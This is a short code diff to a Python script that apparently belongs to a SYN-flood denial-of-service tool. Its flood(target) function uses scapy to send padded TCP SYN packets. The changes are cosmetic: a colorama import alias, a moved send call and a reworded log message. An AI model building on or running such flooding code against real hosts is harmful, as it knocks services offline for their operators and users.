@@ -2,7 +2,7 @@ import socket
 from random import randint
 from typing import Union
 
-from colorama import Fore
+from colorama import Fore as F
 from scapy.all import Raw, send
 from scapy.layers.inet import IP, TCP
 
@@ -32,6 +32,6 @@ def flood(target: str) -> None:
     data = Raw(b"X" * 1024)
 
     packet = ip_layer / tcp_layer / data
-    send(packet, verbose=0)
 
-    print(f"--> TCP Socket on Port {Fore.CYAN}{sport}{Fore.RESET} sent a SYN packet")
+    send(packet, verbose=0)
+    print(f"--> Socket on Port {F.BLUE}{sport}{F.RESET} sent a SYN packet")
